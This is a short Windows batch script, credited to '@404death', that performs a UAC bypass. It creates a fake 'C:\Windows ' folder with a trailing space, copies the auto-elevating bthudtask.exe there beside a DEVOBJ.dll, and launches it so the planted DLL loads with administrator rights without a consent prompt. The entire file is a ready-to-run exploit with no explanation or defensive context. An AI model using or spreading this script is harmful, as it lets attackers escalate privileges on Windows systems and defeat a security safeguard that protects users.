@echo off
echo.
echo #### UAC Bypass In The Wild By @404death ####
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \SysWOW64"
echo  [+] file copying ...
copy "C:\Windows\SysWOW64\bthudtask.exe" "C:\Windows \SysWOW64\"
echo  [+] file copying ...
copy "DEVOBJ.dll" "C:\Windows \SysWOW64\"
"C:\Windows \SysWOW64\bthudtask.exe"
echo  [-] UAC Bypassed ?
